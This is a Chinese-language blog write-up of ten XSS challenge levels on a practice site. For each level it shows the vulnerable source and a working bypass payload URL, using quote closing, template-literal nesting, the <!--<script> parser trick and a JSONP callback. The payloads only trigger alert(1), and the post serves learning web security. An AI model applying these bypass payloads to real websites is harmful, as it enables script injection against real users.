<h3 id="一些BAT的XSS实例（修改而来的XSS题目）"><a href="#一些BAT的XSS实例（修改而来的XSS题目）" class="headerlink" title="一些BAT的XSS实例（修改而来的XSS题目）"></a>一些BAT的XSS实例（修改而来的XSS题目）</h3><h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest1/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest1/</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> x=location.hash;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">aa</span><span class="params">(x)</span></span>&#123;&#125;;</span></span><br><span class="line"><span class="actionscript">setTimeout(<span class="string">"aa('"</span>+x+<span class="string">"')"</span>,<span class="number">100</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Give me xss bypass 1~</span><br></pre></td></tr></table></figure>

<p>这应该是一个DOM XSS，我们只需要对前面的括号进行闭合即可弹窗</p>
<p>payload:<code>http://px1624.sinaapp.com/test/xsstest1/#&#39;);alert(&#39;123</code></p>
<h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest2/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest2/</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Give me xss bypass 2~</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'display:none'</span> <span class="attr">id</span>=<span class="string">'xx'</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'button'</span> <span class="attr">value</span>=<span class="string">'test'</span> <span class="attr">onclick</span>=<span class="string">'alert("哈哈，点这玩意没啥用的！")'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> query = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span></span><br><span class="line"><span class="actionscript">   <span class="keyword">var</span> vars = query.split(<span class="string">"&amp;"</span>);</span></span><br><span class="line"><span class="actionscript">   <span class="keyword">if</span>(vars)&#123;</span></span><br><span class="line">		aa(vars[0],vars[1])</span><br><span class="line">   &#125;</span><br><span class="line"><span class="actionscript">   	<span class="function"><span class="keyword">function</span> <span class="title">aa</span><span class="params">(x,y)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">		$(<span class="string">"#xx"</span>)[x]($(<span class="string">"#xx"</span>)[y]());</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里首先它获取了我们请求的参数，用&amp;分割获取变量，然后将这两个变量传到函数aa中执行，函数aa对id为xx的标签进行了两次dom操作</p>
<p>这里，<code>$(&quot;#xx&quot;)[&#39;text&#39;]()</code>的结果会是<code>&quot;&lt;img src=x onerror=alert(1)&gt;&quot;</code></p>
<p>所以这里的payload:<code>http://px1624.sinaapp.com/test/xsstest2/?append&amp;text</code></p>
<p>于是xx标签就会加上一个xx的text形式</p>
<p><img src="https://i.loli.net/2020/07/16/Mqo1veOpmRtzNa2.png" alt="image-20200714164426445"></p>
<p>从而触发弹窗。</p>
<h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest3/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest3/</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">var</span> px = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">			$(<span class="string">'xss'</span>).val(<span class="string">''</span>);</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里因为源码里的php代码没有显示，所以要猜变量名，这里猜出来用的变量名时px。然后我们传一个px=alert(1)，返回</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">var</span> px = <span class="string">'alert(1)'</span>;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">			$(<span class="string">'xss'</span>).val(<span class="string">'alert(1)'</span>);</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现传入的是字符串，于是我们用引号闭合两边，再用运算符拼接一下即刻触发弹窗</p>
<p>payload:<code>http://px1624.sinaapp.com/test/xsstest3/?px=%27-alert(1)-%27</code></p>
<p>返回：</p>
<p><img src="https://i.loli.net/2020/07/16/qIwr4jZ2Pa5btHR.png" alt="image-20200716174703421"></p>
<h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest3/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest3/</a></p>
<p>第四关在第三关的基础上过滤了运算符，但在js中，in，instanceof也属于运算符，所以可以用这两个进行绕过</p>
<p>但这一题的预期解是用的模板字符串。</p>
<p>payload:<a href="http://px1624.sinaapp.com/test/xsstest4/?px=%27;`;{alert" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest4/?px=%27;`;{alert</a>(%271</p>
<p>返回</p>
<p><img src="https://i.loli.net/2020/07/16/x8g6yJNVKd7Bujc.png" alt="image-20200716174741196"></p>
<p>两次同步输入导致中间的代码都变成了模板字符串。</p>
<h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest5/user.php?callback=Give%20me%20xss%20bypass" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest5/user.php?callback=Give%20me%20xss%20bypass</a>~</p>
<p>这一关进去就重定向到了user.php，发现url上有一个callback参数，</p>
<p>源码只有</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pre</span> <span class="attr">style</span>=<span class="string">"word-wrap: break-word; white-space: pre-wrap;"</span>&gt;</span>Give me xss bypass~<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以输入点就是callback了，输出点在<code>&lt;pre&gt;</code>标签间，<code>&lt;pre&gt;</code>标签中的其他标签都会被实体编码，所以这里无法闭合标签。</p>
<p>然后因为是重定向过来的，所以把重定向给拦了可以看到</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Script</span> <span class="attr">src</span>=<span class="string">"./index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> orguin = $.Tjs_Get(<span class="string">'uin'</span>);</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> pagenum= $.Tjs_Get(<span class="string">'pn'</span>);</span></span><br><span class="line"><span class="javascript">			<span class="keyword">if</span>(orguin&lt;=<span class="number">0</span>) <span class="built_in">window</span>.location=<span class="string">"./user.php?callback=Give me xss bypass~"</span>;</span></span><br><span class="line"><span class="handlebars"><span class="xml">				document.write('<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> 	<span class="attr">src</span>=<span class="string">"http://px1624.sinaapp.com/'+orguin+'?'+pagenum+'"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span>');</span></span></span></span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		Give me xss bypass 5~</span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中Tjs_Get函数在index.js中，主要是获取url参数用的。</p>
<p>所以payload：<code>http://px1624.sinaapp.com/test/xsstest5/?uin=test/xsstest5/user.php&amp;pn=callback=alert(1)</code></p>
<p>返回</p>
<p><img src="https://i.loli.net/2020/07/16/hKC5lJEaPs67kpr.png" alt="image-20200716174808888"></p>
<p>因为<a href="http://px1624.sinaapp.com/test/xsstest5/user.php?callback=alert(1)这个文件内容只有alert(1)，被JS引擎解释执行后于是产生弹窗。" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest5/user.php?callback=alert(1)这个文件内容只有alert(1)，被JS引擎解释执行后于是产生弹窗。</a></p>
<h4 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest6" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest6</a></p>
<p>相比第五关，可控的参数只有一个了，少了问号，并且过滤了问号和百分号，这就阻止了url编码</p>
<p>这里是用的js里替换了%</p>
<p><img src="https://i.loli.net/2020/07/17/JlqyIudcxtnBbeV.png" alt="image-20200717132954073"></p>
<p>但这里匹配？用的是正则，和.*一起，而在<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions" target="_blank" rel="noopener">js的正则</a>里 点 匹配除了换行符以外的任意字符，并且匹配到换行符以后就会返回了，不会继续匹配下去。所以换行符应该就是突破点了，可是在url里换行符得用编码%0a表示，可%又被过滤了，<del>套娃?!</del>。这里出题人指出，表示换行符并不只%0a,<a href="http://tools.jb51.net/table/javascript_escape" target="_blank" rel="noopener">这里</a>指出换行符还可以用\u000A，\u000D，\u2028和 \u2029表示</p>
<p>于是测试payload:<code>location=&quot;http://px1624.sinaapp.com/test/xsstest6/?#11?\u2028&amp;uin=../test/xsstest6/user.php?callback=alert()&quot;</code>，这里不能直接在url上输入，不然\u2028会被认为是字符串，所以只能在控制台打。然而我依旧没有成功（作者原话：得用老版Chrome或者IE，新版的Chorme对location.hash的特殊字符也进行了URL编码，所以导致\u2028和\u2029这种换行符的解析失效，从而不能用。)</p>
<p>最后这里第六关的user.php还对参数的值的长度做了要求，刚好无法弹1；</p>
<p>这里绕过的方法一个是用第五关的user.php，另一个方法，作者是用的name传参，利用iframe去这样构造</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span> = <span class="string">"px"</span> <span class="attr">name</span> = <span class="string">"&lt;img src=x onerror=alert(1)&gt;"</span> <span class="attr">src</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElemntById(<span class="string">"px"</span>).src=<span class="string">"http://px1624.sinaapp.com/test/xsstest6/#?\u2028uin=../test/xsstest6/user.php?callback=$&#123;name&#125;"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest7" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest7</a></p>
<p>输入点是px，输出点位于<code>&lt;script&gt;</code>标签间，但是会对特殊符号进行转义。经测试并没有对反斜杠进行转义，所以可以用反斜杠把它的反斜杠给过滤掉，从而逃逸出单引号，</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?px=\'-alert(1)-</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px=<span class="string">'\\'</span>-alert(<span class="number">1</span>)-<span class="string">';</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是后面那个单引号则没有办法，</p>
<p>因为这里也有同步输出，所以想用第四题那种模板字符串，但是这里一个输出在js中，一个在html中，所以失败</p>
<p><img src="https://i.loli.net/2020/07/16/PtJAEofjhLVgknK.png" alt="image-20200715110011446"></p>
<p>这里要用到一个<code>&lt;script&gt;</code>标签的特性</p>
<p>参考<a href="https://www.dazhuanlan.com/2019%2F10%2F25%2F5db1e6beea817/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019%2F10%2F25%2F5db1e6beea817/</a></p>
<p>HTML5解析器在标签<code>&lt;script&gt;&lt;/script&gt;</code>中解析到<code>&lt;!--</code>时候，会进入到dash dash escaped state，哪怕是<code>&lt;script&gt;</code>出现在js的字符串中。</p>
<p>大概意思就是在script标签里如果遇到<code>&lt;!--</code>，那么这个的解析优先级会变成最高，如果这个后面再出现<code>&lt;script&gt;</code>标签，那么最近的另一个<code>&lt;/script&gt;</code>标签就会优先去闭合这个。</p>
<p>于是我们输入<code>?px=&lt;!--&lt;script%20&gt;</code>，因为&gt;会被转义，所以我们前面打一个空格，<code>&lt;!--&lt;script%20&gt;</code>被转义为<code>\&lt;!--\&lt;script%20\&gt;</code>，根据js的特性，这等于<code>\&lt;!--\&lt;script%20\=&#39;&#39;&gt;</code>,<code>\</code>被认为是一个属性了，值是空，所以这个<code>&lt;script&gt;</code>标签被解析。</p>
<p>于是该字符串下方的<code>&lt;/script&gt;</code>则被用来闭合我们的输入</p>
<p><img src="https://i.loli.net/2020/07/16/hnTVeNfubr8o94q.png" alt="image-20200715111558811"></p>
<p>这样两次同步输出都在js中了，于是这里使用模板字符串，用运算符拼接字符串</p>
<p>payload:</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px<span class="number">1624</span>.sinaapp.com/test/xsstest<span class="number">7</span>/?px=\<span class="symbol">%27</span>-`-alert(<span class="number">1</span>)//<span class="symbol">%3</span>C<span class="title">!--</span><span class="symbol">%3</span>Cscript<span class="symbol">%20</span><span class="symbol">%3</span>E<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>返回</p>
<p><img src="https://i.loli.net/2020/07/16/REqsXPfg9U1n4ed.png" alt="image-20200715113149100"></p>
<h4 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest8/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest8/</a></p>
<p>第八关较第七关，输入点多了一个px1624</p>
<p>同样也是同步输出，除去两个在<code>&lt;script&gt;</code>标签里的输出点，一个在<code>&lt;div&gt;</code>标签间，一个是<code>&lt;input&gt;</code>标签的value值，但是px1624的值就是px的值</p>
<p><img src="https://i.loli.net/2020/07/16/rtOI1X2A9Bk5jPw.png" alt="image-20200715113615191"></p>
<p>输出点出现在value处，首先想到的是闭合双引号，然后用on事件触发弹窗，然而这里对双引号做了过滤，所以这里还是要跳出<code>&lt;script&gt;</code>标签，</p>
<p>首先用    <code>http://px1624.sinaapp.com/test/xsstest8/?px=%3C!--%3Cscript%20%3E</code>跳出</p>
<p><img src="https://i.loli.net/2020/07/16/RWcE7VvIfqmwk6T.png" alt="image-20200715133932290"></p>
<p>个人理解：这里第一个<code>&lt;!--</code>遇到了<code>&lt;script&gt;</code>，随后优先级变高，紧跟着下面的那个<code>&lt;!--</code>就直接被无视了，然后遇到了下面的<code>&lt;/script&gt;</code>，直接拿了过来，优先级回落，然后最后一行又出现了<code>&lt;!--&lt;script &gt;</code>，但是后面已经没内容了，随后浏览器进行DOM渲染， 补上了<code>&lt;/script&gt;</code>。</p>
<p>最终payload:<code>http://px1624.sinaapp.com/test/xsstest8/?px=%3C!--%3C/script%3E%3Cscript%20%3Ealert(1)%3C/script%3E</code></p>
<p>以<code>&lt;/script&gt;</code>开头，在<code>&lt;!--</code>遇到<code>&lt;script&gt;</code>后被提升的优先级回落后【优先级回落前，遇到的第二个<code>&lt;!--&lt;script&gt;</code>并不能起到作用】，立刻闭合最前面的<code>&lt;script&gt;</code>标签，随后自己再补上一个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>进行弹窗，这里是第四个输出点，并没有被编码or转义，故弹窗成功。</p>
<p>返回</p>
<p><img src="https://i.loli.net/2020/07/16/EYCP9AyfUVgzMSi.png" alt="image-20200715142513727"></p>
<h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest9/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest9/</a></p>
<p>同样四个输出点，但是下面都做了一个html实体编码，因此用第八题的payload我们没法主动去闭合第一个<code>&lt;script&gt;</code>标签，更没法弹窗了</p>
<p><img src="https://i.loli.net/2020/07/16/VzUPbATemHGjlDq.png" alt="image-20200716140504739"></p>
<p>所以这里的思路，只要在<code>&lt;script&gt;</code>标签中写入<code>alert(1)</code>就能弹窗了，这里应该要用到字符串与运算符间的拼接，然后要利用到模板字符串。当然，用<code>&lt;--！</code>跳出<code>&lt;script&gt;</code>也是必不可少的一个步骤。（注意到，其实第三个和第四个输出点是由长度限制的，我们可以用这个长度限制来解决一些问题。</p>
<p>最终的payload：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//px</span>1624.sinaapp.com/test/xsstest9/?px=a\%27-&#123;a:<span class="string">`&#125;-alert(1)//`</span>&#125;-&#123;a:<span class="string">`$&#123;`</span>%3C!--%3Cscript%20%3E</span><br></pre></td></tr></table></figure>

<p>返回：</p>
<p><img src="https://i.loli.net/2020/07/16/uJTKMs1SYFhHUpz.png" alt="image-20200716145039824"></p>
<p>从下面两个输出点看起的话可以发现，这里没有对<code>/</code>进行转义，所以可以注释后面的一个标签。然后由于多余的`都被截断了，这里刚好剩下两个，可以用来闭合上面多出来的。而上面连续的两个`则用嵌套的方式隔开。由于同步输出，所以第一行后半部分也会有两个`,也正好对应前面两个`。</p>
<p>对于构造步骤：</p>
<p>首先是想在前面独立出一个alert(1)，</p>
<p><img src="https://i.loli.net/2020/07/16/BGZC1dE7pAlwoc9.png" alt="image-20200716152142498"></p>
<p>类似这样，但这需要后面都被模板字符串包裹，测试过很多种，都没有成功实现。</p>
<p>于是想着在最后独立出一个alert(1)，后面的标签可以注释掉。又因为同步输出的问题，一行里的`的个数得是一个奇数才能达到一个逃逸的效果；但如果是偶数的话，利用嵌套，也可以达到跨行闭合的效果。而嵌套我们用对象，是{a:`${`的形式，所以得有一个`}来闭合{`，然后还得有一个}来闭合{，所以前半段得出现`}和}，既然有了}，那也得个{来闭合。于是就有了{a:`}xxxx}的形式，再补上一个`，变成{a:`}xxxx`}，这样这一段就是独立的了，并且补上的这个`也闭合了之前嵌套的`，再插入一个alert(1)，就有了下面的payload。</p>
<p><img src="https://i.loli.net/2020/07/16/tzD1glFVO5BHcd7.png" alt="image-20200716154041206"></p>
<p>这样子上半部分就配合的很好了，至于下面，`出现了四次，我们可以在前面填充下，就能抹去多余的两个`，从而实现弹窗</p>
<p><img src="https://i.loli.net/2020/07/16/vGb3TEDukaRKS5F.png" alt="image-20200716154225875"></p>
<p>这一关可能思路不是很顺，因为payload也不是自己测出来的，是对出题人给的payload的理解。</p>
<h4 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest10/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest10/</a></p>
<p>相较于第九关，这一关的第三个输出点长度只输出两位，第四个输出点不限制长度</p>
<p>由于只有两个字符，所以`}大概是比较有用的，我们把这个放在第九关payload的最前面</p>
<p>返回</p>
<p><img src="https://i.loli.net/2020/07/16/TOzAIsjX4Qfpxa9.png" alt="image-20200716161451024"></p>
<p>提前闭合了，于是，想着再嵌套一层？刚好也多了两层`}，这样最后一行的alert(1)就可以出来了</p>
<p>payload</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//px</span>1624.sinaapp.com/test/xsstest1<span class="number">0</span>/?px=<span class="string">`&#125;\%27-&#123;a:`</span>&#125;-alert(<span class="number">1</span>)//<span class="string">`&#125;-&#123;a:`</span>$&#123;<span class="string">`$&#123;`</span>%3C!--%3Cscript%20%3E//</span><br></pre></td></tr></table></figure>

<p>返回</p>
<p><img src="https://i.loli.net/2020/07/16/E4MoUlckhSyFW21.png" alt="image-20200716161840912"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这里是对这几个关卡的知识点的简单总结叭</p>
<p>第一关是一个简单的DOM型XSS，这里只需要进行一个简单的闭合操作就可，然后用到的取参函数是location.hash，所以对JavaScript需要有一定的熟悉。</p>
<p>第二关是考点是一个dom操作</p>
<p>第三关除了闭合外，还有JavaScript的字符串与运算符相关的知识：由于JavaScript是个弱类型，所以字符串之间也可以进行运算操作，也可以拿来做一种变相的拼接</p>
<p>第四关出现了字符型的运算符以及模板字符串相关的知识点，不过模板字符串一般需要至少两个可控输出点</p>
<p>第五关有一个重定向的小坑，不过问题不大。这里主要也是因为对参数过滤的不严格导致的xss，然后考点也是对输入点间的相互配合以达到利用效果叭</p>
<p>第六关主要利用的是Js的正则表达式、换行符相关的基础知识，以及对服务端其他文件的一些利用（比如用了第五关的user.php)</p>
<p>第七关是对<code>&lt;!-- &lt;script&gt;</code>以及模板字符串性质的利用，这些运用也都有在后面的关卡出现</p>
<p>第八关有四个同步输出点了，这一关的利用难度也提升了一个档次，同时也让我们对<code>&lt;!-- &lt;script&gt;</code>有了更深层次的理解。</p>
<p>第九关在第八关的基础上对后面两个输出点进行了编码，所以我们无法像第八关一样闭合前面的<code>&lt;script&gt;</code>，再自己写一个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>来弹窗，只能在他给好的<code>&lt;script&gt;</code>标签间进行弹窗。这里用到了JavaScript的嵌套相关的性质</p>
<p>第十关在第九关的基础上对后面两个输出点的长度做了限制，这里过关的paylaod与第九关相比就是用到了更多一层的嵌套。</p>
<p>&emsp;&emsp;其实这里十关做下来，并没有用到XSS特殊的bypass姿势，主要还是对JavaScript的一些基础性质做了详细的了解学习，毕竟这里也都是一些反射型、DOM型XSS，可能在实际的漏洞挖掘中并没有很大的用处，利用起来也相对困难（很多厂商也不收），但对于我这个初学者来说还是受益良多。</p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;总的来看，在应用上，存储型XSS &gt; DOM型XSS ≈反射型XSS。为什么这么说？因为存储型XSS最持久，而且更为隐蔽，因为是存在数据库当中的，触发的url当中没有带js或者其他的html代码。然后反射型XSS和DOM型XSS，因为它们都需要在url中加入js代码才能够触发，所以需要与人交互<del>钓鱼</del>才能产生效果，否则也只能是自己日自己。</p>

      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 643713081@qq.com </span>
    </div>
</article>


<p>
    <a  class="dashang" onclick="dashangToggle()">赏</a>
</p>


<div class="article_copyright">
    <p><span class="copy-title">文章标题:</span>Web学习笔记 之 XSS</p>
    <p><span class="copy-title">文章字数:</span><span class="post-count">7.8k</span></p>
    <p><span class="copy-title">本文作者:</span><a  title="Van1sh">Van1sh</a></p>
    <p><span class="copy-title">发布时间:</span>2020-07-26, 10:44:00</p>
    <p><span class="copy-title">最后更新:</span>2020-07-26, 11:33:15</p>
    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/07/26/Web学习笔记 之 XSS/" title="Web学习笔记 之 XSS">http://jayxv.github.io/2020/07/26/Web学习笔记 之 XSS/</a>
    <p>
        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
    </p>
</div>





    




    </div>
    <div class="copyright">
        <p class="footer-entry">©2020 Van1sh</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">目录</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" ></a>

    </div>
</div>
<div class="acParent"></div>

<div class="hide_box" onclick="dashangToggle()"></div>
<div class="shang_box">
    <a class="shang_close"  onclick="dashangToggle()">×</a>
